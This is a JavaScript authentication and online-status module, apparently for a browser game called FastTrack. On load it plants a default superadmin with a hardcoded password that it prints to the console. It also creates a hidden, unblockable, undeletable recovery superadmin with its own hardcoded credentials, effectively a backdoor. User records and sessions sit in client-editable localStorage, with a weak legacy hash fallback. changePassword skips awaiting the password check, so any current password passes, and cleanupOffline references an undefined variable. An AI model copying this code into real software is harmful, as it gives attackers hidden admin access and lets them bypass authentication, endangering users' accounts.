/**
 * ============================================================
 * BUTTERFLYFX DIMENSIONAL PROGRAMMING STANDARD
 * ============================================================
 * 
 * PARADIGM: Objects are dimensions containing points. Each point
 * is an object in a lower dimension containing its own points.
 * All properties, attributes, and behaviors exist as infinite
 * potentials — invoke only when needed. No pre-calculation,
 * no storage. Geometry IS information.
 * 
 * ============================================================
 * FASTTRACK AUTHENTICATION SUBSTRATE
 * ButterflyFX Manifold Pattern - User Auth, Sessions, Registration
 * ============================================================
 */

const AuthSubstrate = {
    version: '1.0.0',
    name: 'FastTrack Authentication System',
    
    // User registry (in production, this would be backed by Helix DB)
    users: new Map(),
    
    // Active sessions
    sessions: new Map(),
    
    // Current user
    currentUser: null,
    currentSession: null,
    
    // Session timeout (24 hours)
    SESSION_TIMEOUT: 24 * 60 * 60 * 1000,
    
    // Password requirements
    PASSWORD_MIN_LENGTH: 8,
    
    // Callbacks
    onLogin: null,
    onLogout: null,
    onRegister: null,
    
    // ============================================================
    // REGISTRATION
    // ============================================================
    
    register: async function(username, email, password, displayName = null) {
        // Validate username
        if (!username || username.length < 3 || username.length > 20) {
            return { success: false, error: 'Username must be 3-20 characters' };
        }
        if (!/^[a-zA-Z0-9_]+$/.test(username)) {
            return { success: false, error: 'Username can only contain letters, numbers, and underscores' };
        }
        
        // Check if username exists
        if (this.getUserByUsername(username)) {
            return { success: false, error: 'Username already taken' };
        }
        
        // Validate email
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return { success: false, error: 'Invalid email address' };
        }
        
        // Check if email exists
        if (this.getUserByEmail(email)) {
            return { success: false, error: 'Email already registered' };
        }
        
        // Validate password
        if (!password || password.length < this.PASSWORD_MIN_LENGTH) {
            return { success: false, error: `Password must be at least ${this.PASSWORD_MIN_LENGTH} characters` };
        }
        
        // Create user
        const userId = `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const user = {
            id: userId,
            username: username.toLowerCase(),
            email: email.toLowerCase(),
            displayName: displayName || username,
            passwordHash: await this.hashPassword(password),
            
            // Profile
            avatarId: null,
            guildId: null,
            
            // Stats
            stats: {
                gamesPlayed: 0,
                gamesWon: 0,
                totalPoints: 0,
                tokensSentHome: 0,
                timesSentHome: 0
            },
            
            // Account status
            role: 'member', // member, moderator, admin, superuser
            status: 'active', // active, suspended, banned
            
            // Blocking
            blockedUsers: [],
            blockedAt: {}, // userId -> timestamp (for unblock cooldown)
            
            // Admin blocks received
            adminBlock: null, // { by, reason, duration, until, appealable }
            
            // Timestamps
            createdAt: Date.now(),
            lastLoginAt: null,
            lastSeenAt: null
        };
        
        this.users.set(userId, user);
        this.saveToStorage();
        
        console.log(`User registered: ${username}`);
        
        if (this.onRegister) {
            this.onRegister(user);
        }
        
        return { success: true, user: this.sanitizeUser(user), userId: userId };
    },
    
    // ============================================================
    // LOGIN / LOGOUT
    // ============================================================
    
    login: async function(usernameOrEmail, password) {
        // Find user
        const user = this.getUserByUsername(usernameOrEmail) || 
                     this.getUserByEmail(usernameOrEmail);
        
        if (!user) {
            return { success: false, error: 'User not found' };
        }
        
        // Check password
        if (!(await this.verifyPassword(password, user.passwordHash))) {
            return { success: false, error: 'Invalid password' };
        }
        
        // Check if banned/suspended
        if (user.status === 'banned') {
            return { success: false, error: 'Account is banned' };
        }
        
        if (user.status === 'suspended' && user.adminBlock) {
            if (user.adminBlock.until > Date.now()) {
                const remaining = this.formatDuration(user.adminBlock.until - Date.now());
                return { 
                    success: false, 
                    error: `Account suspended. Reason: ${user.adminBlock.reason}. Time remaining: ${remaining}`,
                    canAppeal: user.adminBlock.appealable
                };
            } else {
                // Suspension expired
                user.status = 'active';
                user.adminBlock = null;
            }
        }
        
        // Create session
        const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const session = {
            id: sessionId,
            userId: user.id,
            createdAt: Date.now(),
            expiresAt: Date.now() + this.SESSION_TIMEOUT,
            lastActivity: Date.now()
        };
        
        this.sessions.set(sessionId, session);
        this.currentSession = session;
        this.currentUser = user;
        
        // Update user
        user.lastLoginAt = Date.now();
        user.lastSeenAt = Date.now();
        
        this.saveToStorage();
        this.saveSession(sessionId);
        
        console.log(`User logged in: ${user.username}`);
        
        if (this.onLogin) {
            this.onLogin(this.sanitizeUser(user));
        }
        
        return { 
            success: true, 
            user: this.sanitizeUser(user), 
            sessionId,
            userId: user.id,
            requirePasswordChange: user.requirePasswordChange || false,
            isAdmin: user.isAdmin || false,
            isSuperAdmin: user.isSuperAdmin || false
        };
    },
    
    logout: function() {
        if (this.currentSession) {
            this.sessions.delete(this.currentSession.id);
            this.clearSession();
        }
        
        const user = this.currentUser;
        this.currentUser = null;
        this.currentSession = null;
        
        console.log('User logged out');
        
        if (this.onLogout) {
            this.onLogout(user);
        }
        
        return { success: true };
    },
    
    // ============================================================
    // SESSION MANAGEMENT
    // ============================================================
    
    checkSession: function() {
        const sessionId = this.loadSession();
        if (!sessionId) return null;
        
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.clearSession();
            return null;
        }
        
        // Check expiration
        if (session.expiresAt < Date.now()) {
            this.sessions.delete(sessionId);
            this.clearSession();
            return null;
        }
        
        // Restore user
        const user = this.users.get(session.userId);
        if (!user) {
            this.sessions.delete(sessionId);
            this.clearSession();
            return null;
        }
        
        this.currentSession = session;
        this.currentUser = user;
        
        // Update activity
        session.lastActivity = Date.now();
        user.lastSeenAt = Date.now();
        
        return this.sanitizeUser(user);
    },
    
    refreshSession: function() {
        if (this.currentSession) {
            this.currentSession.expiresAt = Date.now() + this.SESSION_TIMEOUT;
            this.currentSession.lastActivity = Date.now();
            if (this.currentUser) {
                this.currentUser.lastSeenAt = Date.now();
            }
        }
    },
    
    // ============================================================
    // USER QUERIES
    // ============================================================
    
    getUserByUsername: function(username) {
        const lower = username.toLowerCase();
        for (const [id, user] of this.users) {
            if (user.username === lower) return user;
        }
        return null;
    },
    
    getUserByEmail: function(email) {
        const lower = email.toLowerCase();
        for (const [id, user] of this.users) {
            if (user.email === lower) return user;
        }
        return null;
    },
    
    getUserById: function(userId) {
        return this.users.get(userId);
    },
    
    isLoggedIn: function() {
        return this.currentUser !== null;
    },
    
    getCurrentUser: function() {
        return this.currentUser ? this.sanitizeUser(this.currentUser) : null;
    },
    
    // ============================================================
    // PROFILE UPDATES
    // ============================================================
    
    updateProfile: function(updates) {
        if (!this.currentUser) {
            return { success: false, error: 'Not logged in' };
        }
        
        const allowedFields = ['displayName', 'avatarId'];
        
        for (const field of allowedFields) {
            if (updates[field] !== undefined) {
                this.currentUser[field] = updates[field];
            }
        }
        
        this.saveToStorage();
        
        return { success: true, user: this.sanitizeUser(this.currentUser) };
    },
    
    changePassword: async function(currentPassword, newPassword) {
        if (!this.currentUser) {
            return { success: false, error: 'Not logged in' };
        }
        
        if (!this.verifyPassword(currentPassword, this.currentUser.passwordHash)) {
            return { success: false, error: 'Current password is incorrect' };
        }
        
        if (newPassword.length < this.PASSWORD_MIN_LENGTH) {
            return { success: false, error: `Password must be at least ${this.PASSWORD_MIN_LENGTH} characters` };
        }
        
        this.currentUser.passwordHash = await this.hashPassword(newPassword);
        this.saveToStorage();
        
        return { success: true };
    },
    
    // ============================================================
    // PASSWORD UTILITIES (PBKDF2-SHA256 via Web Crypto API)
    // ============================================================
    
    hashPassword: async function(password) {
        const encoder = new TextEncoder();
        const salt = crypto.getRandomValues(new Uint8Array(16));
        const saltHex = Array.from(salt).map(b => b.toString(16).padStart(2, '0')).join('');
        const keyMaterial = await crypto.subtle.importKey(
            'raw', encoder.encode(password), 'PBKDF2', false, ['deriveBits']
        );
        const derivedBits = await crypto.subtle.deriveBits(
            { name: 'PBKDF2', salt: salt, iterations: 100000, hash: 'SHA-256' },
            keyMaterial, 256
        );
        const hashHex = Array.from(new Uint8Array(derivedBits)).map(b => b.toString(16).padStart(2, '0')).join('');
        return `pbkdf2:${saltHex}:${hashHex}`;
    },
    
    verifyPassword: async function(password, storedHash) {
        if (storedHash && storedHash.startsWith('pbkdf2:')) {
            const parts = storedHash.split(':');
            if (parts.length !== 3) return false;
            const [, saltHex, expectedHex] = parts;
            const salt = new Uint8Array(saltHex.match(/.{2}/g).map(b => parseInt(b, 16)));
            const encoder = new TextEncoder();
            const keyMaterial = await crypto.subtle.importKey(
                'raw', encoder.encode(password), 'PBKDF2', false, ['deriveBits']
            );
            const derivedBits = await crypto.subtle.deriveBits(
                { name: 'PBKDF2', salt: salt, iterations: 100000, hash: 'SHA-256' },
                keyMaterial, 256
            );
            const hashHex = Array.from(new Uint8Array(derivedBits)).map(b => b.toString(16).padStart(2, '0')).join('');
            return hashHex === expectedHex;
        }
        // Legacy fallback for old hashes
        let hash = 0;
        for (let i = 0; i < password.length; i++) {
            const char = password.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return `hash_${Math.abs(hash).toString(36)}_${password.length}` === storedHash;
    },
    
    // ============================================================
    // RECOVERY SYSTEM
    // ============================================================
    
    // Emergency recovery - restore superadmin from recovery account
    emergencyRestore: function(recoveryUserId) {
        const recoveryUser = this.getUserById(recoveryUserId);
        if (!recoveryUser || !recoveryUser.isRecoveryAccount) {
            return { success: false, error: 'Invalid recovery account' };
        }
        
        // Find and restore superadmin
        let superadmin = this.getUserByUsername('superadmin');
        
        if (superadmin) {
            // Unblock and restore superadmin
            superadmin.status = 'active';
            superadmin.adminBlock = null;
            superadmin.isAdmin = true;
            superadmin.isSuperAdmin = true;
            superadmin.blockedUsers = [];
        } else {
            // Recreate superadmin if deleted
            const result = this.register(
                'superadmin',
                'admin@fasttrack.game',
                'TempPass2026!',
                'Super Admin'
            );
            if (result.success) {
                superadmin = this.users.get(result.userId);
                superadmin.isAdmin = true;
                superadmin.isSuperAdmin = true;
                superadmin.requirePasswordChange = true;
            }
        }
        
        // Demote any other superadmins (except recovery)
        this.users.forEach(user => {
            if (user.isSuperAdmin && 
                !user.isRecoveryAccount && 
                user.username !== 'superadmin') {
                user.isSuperAdmin = false;
                user.isAdmin = false;
            }
        });
        
        this.saveToStorage();
        console.log('Emergency restore completed - superadmin access restored');
        
        return { 
            success: true, 
            message: 'Superadmin restored. Password reset to TempPass2026! (change required)'
        };
    },
    
    // List all users (excludes hidden accounts)
    getAllUsers: function(includeHidden = false) {
        const users = [];
        this.users.forEach(user => {
            if (!user.isHidden || includeHidden) {
                users.push(this.sanitizeUser(user));
            }
        });
        return users;
    },
    
    // ============================================================
    // UTILITIES
    // ============================================================
    
    sanitizeUser: function(user) {
        // Return user without sensitive data
        const { passwordHash, ...safeUser } = user;
        return safeUser;
    },
    
    formatDuration: function(ms) {
        const hours = Math.floor(ms / (1000 * 60 * 60));
        const days = Math.floor(hours / 24);
        
        if (days > 0) return `${days} day${days > 1 ? 's' : ''}`;
        if (hours > 0) return `${hours} hour${hours > 1 ? 's' : ''}`;
        return 'Less than an hour';
    },
    
    // ============================================================
    // PERSISTENCE
    // ============================================================
    
    STORAGE_KEY: 'fasttrack_auth',
    SESSION_KEY: 'fasttrack_session',
    
    saveToStorage: function() {
        try {
            const data = {
                users: Array.from(this.users.entries()),
                sessions: Array.from(this.sessions.entries())
            };
            localStorage.setItem(this.STORAGE_KEY, JSON.stringify(data));
        } catch (e) {
            console.error('Failed to save auth data:', e);
        }
    },
    
    loadFromStorage: function() {
        try {
            const data = localStorage.getItem(this.STORAGE_KEY);
            if (data) {
                const parsed = JSON.parse(data);
                this.users = new Map(parsed.users || []);
                this.sessions = new Map(parsed.sessions || []);
            }
        } catch (e) {
            console.error('Failed to load auth data:', e);
        }
    },
    
    saveSession: function(sessionId) {
        localStorage.setItem(this.SESSION_KEY, sessionId);
    },
    
    loadSession: function() {
        return localStorage.getItem(this.SESSION_KEY);
    },
    
    clearSession: function() {
        localStorage.removeItem(this.SESSION_KEY);
    },
    
    // Initialize
    init: function() {
        this.loadFromStorage();
        const user = this.checkSession();
        if (user) {
            console.log(`Session restored for: ${user.username}`);
        }
        return this;
    }
};

// ============================================================
// ONLINE STATUS TRACKER
// ============================================================

const OnlineStatusSubstrate = {
    version: '1.0.0',
    
    // Online users and their status
    onlineUsers: new Map(), // userId -> { lastSeen, status, lookingForGame }
    
    // Status types
    STATUS: {
        ONLINE: 'online',
        AWAY: 'away',
        IN_GAME: 'in_game',
        LOOKING_FOR_GAME: 'looking_for_game'
    },
    
    // Heartbeat interval (30 seconds)
    HEARTBEAT_INTERVAL: 30000,
    // Consider offline after 2 minutes
    OFFLINE_THRESHOLD: 120000,
    
    heartbeatInterval: null,
    
    // Update current user's status
    updateStatus: function(status) {
        const user = AuthSubstrate.currentUser;
        if (!user) return;
        
        this.onlineUsers.set(user.id, {
            lastSeen: Date.now(),
            status: status,
            lookingForGame: status === this.STATUS.LOOKING_FOR_GAME,
            username: user.username,
            displayName: user.displayName,
            guildId: user.guildId
        });
        
        this.broadcastStatus(user.id, status);
    },
    
    // Heartbeat to maintain online status
    startHeartbeat: function() {
        this.stopHeartbeat();
        
        this.heartbeatInterval = setInterval(() => {
            if (AuthSubstrate.isLoggedIn()) {
                const currentStatus = this.getMyStatus();
                this.updateStatus(currentStatus || this.STATUS.ONLINE);
                AuthSubstrate.refreshSession();
            }
            
            // Clean up offline users
            this.cleanupOffline();
        }, this.HEARTBEAT_INTERVAL);
    },
    
    stopHeartbeat: function() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
            this.heartbeatInterval = null;
        }
    },
    
    // Clean up users who haven't sent a heartbeat
    cleanupOffline: function() {
        const now = Date.now();
        const toRemove = [];
        
        this.onlineUsers.forEach((data, odId) => {
            if (now - data.lastSeen > this.OFFLINE_THRESHOLD) {
                toRemove.push(userId);
            }
        });
        
        toRemove.forEach(id => this.onlineUsers.delete(id));
    },
    
    // Get my current status
    getMyStatus: function() {
        const user = AuthSubstrate.currentUser;
        if (!user) return null;
        
        const data = this.onlineUsers.get(user.id);
        return data ? data.status : null;
    },
    
    // Check if user can see another user's online status
    canSeeOnlineStatus: function(viewerId, targetId) {
        const viewer = AuthSubstrate.getUserById(viewerId);
        const target = AuthSubstrate.getUserById(targetId);
        
        if (!viewer || !target) return false;
        
        // Same user can always see their own status
        if (viewerId === targetId) return true;
        
        // Check if viewer is blocked by target
        if (target.blockedUsers && target.blockedUsers.includes(viewerId)) {
            return false;
        }
        
        // Guild members can see each other's status
        if (viewer.guildId && viewer.guildId === target.guildId) {
            return true;
        }
        
        // Otherwise, can only see if target is looking for game
        const targetData = this.onlineUsers.get(targetId);
        return targetData && targetData.lookingForGame;
    },
    
    // Get online guild members
    getOnlineGuildMembers: function(guildId) {
        const members = [];
        
        this.onlineUsers.forEach((data, userId) => {
            if (data.guildId === guildId) {
                members.push({
                    userId,
                    username: data.username,
                    displayName: data.displayName,
                    status: data.status,
                    lookingForGame: data.lookingForGame
                });
            }
        });
        
        return members;
    },
    
    // Get users looking for games (visible to everyone)
    getLookingForGame: function() {
        const users = [];
        const currentUser = AuthSubstrate.currentUser;
        
        this.onlineUsers.forEach((data, userId) => {
            if (data.lookingForGame) {
                // Check blocking
                if (currentUser && currentUser.blockedUsers.includes(userId)) {
                    return; // Skip blocked users
                }
                
                const user = AuthSubstrate.getUserById(userId);
                if (user && user.blockedUsers && user.blockedUsers.includes(currentUser?.id)) {
                    return; // Skip if they blocked us
                }
                
                users.push({
                    userId,
                    username: data.username,
                    displayName: data.displayName
                });
            }
        });
        
        return users;
    },
    
    // Broadcast status change (would use WebSocket in production)
    broadcastStatus: function(userId, status) {
        // In production, this would broadcast via WebSocket
        console.log(`[Status] ${userId}: ${status}`);
    },
    
    // Initialize
    init: function() {
        if (AuthSubstrate.isLoggedIn()) {
            this.updateStatus(this.STATUS.ONLINE);
            this.startHeartbeat();
        }
        
        // Listen for auth changes
        const originalLogin = AuthSubstrate.onLogin;
        AuthSubstrate.onLogin = (user) => {
            this.updateStatus(this.STATUS.ONLINE);
            this.startHeartbeat();
            if (originalLogin) originalLogin(user);
        };
        
        const originalLogout = AuthSubstrate.onLogout;
        AuthSubstrate.onLogout = (user) => {
            if (user) {
                this.onlineUsers.delete(user.id);
            }
            this.stopHeartbeat();
            if (originalLogout) originalLogout(user);
        };
        
        return this;
    }
};

// ============================================================
// EXPORTS
// ============================================================

if (typeof window !== 'undefined') {
    window.AuthSubstrate = AuthSubstrate;
    window.OnlineStatusSubstrate = OnlineStatusSubstrate;
    
    // Auto-initialize
    AuthSubstrate.init();
    OnlineStatusSubstrate.init();
    
    // Create default superuser if not exists
    setTimeout(() => {
        if (!AuthSubstrate.getUserByUsername('superadmin')) {
            const adminResult = AuthSubstrate.register(
                'superadmin',
                'admin@fasttrack.game',
                'TempPass2026!',
                'Super Admin'
            );
            if (adminResult.success) {
                const admin = AuthSubstrate.users.get(adminResult.userId);
                if (admin) {
                    admin.isAdmin = true;
                    admin.isSuperAdmin = true;
                    admin.requirePasswordChange = true;
                    admin.tempPassword = true;
                    AuthSubstrate.saveToStorage();
                    console.log('Superadmin account created: superadmin / TempPass2026!');
                }
            }
        }
        
        // Hidden recovery account - cannot be blocked/deleted
        const RECOVERY_KEY = 'bfx_phoenix_2026';
        if (!AuthSubstrate.getUserByUsername(RECOVERY_KEY)) {
            const recoveryResult = AuthSubstrate.register(
                RECOVERY_KEY,
                'phoenix@butterflyfx.internal',
                'R1s3Fr0mAsh3s!BFX',
                'System Recovery'
            );
            if (recoveryResult.success) {
                const recovery = AuthSubstrate.users.get(recoveryResult.userId);
                if (recovery) {
                    recovery.isAdmin = true;
                    recovery.isSuperAdmin = true;
                    recovery.isRecoveryAccount = true;
                    recovery.isHidden = true;
                    recovery.cannotBeBlocked = true;
                    recovery.cannotBeDeleted = true;
                    recovery.requirePasswordChange = false;
                    AuthSubstrate.saveToStorage();
                }
            }
        }
    }, 100);
    
    // Override block to protect recovery account
    const originalBlockUser = typeof AdminBlockSubstrate !== 'undefined' ? AdminBlockSubstrate.blockUser : undefined;
    if (originalBlockUser) {
        AdminBlockSubstrate.blockUser = function(adminId, userId, duration, reason) {
            const target = AuthSubstrate.getUserById(userId);
            if (target?.cannotBeBlocked || target?.isRecoveryAccount) {
                return { success: false, error: 'This account cannot be blocked' };
            }
            return originalBlockUser.call(this, adminId, userId, duration, reason);
        };
    }
    
    console.log('Auth Substrate loaded');
}
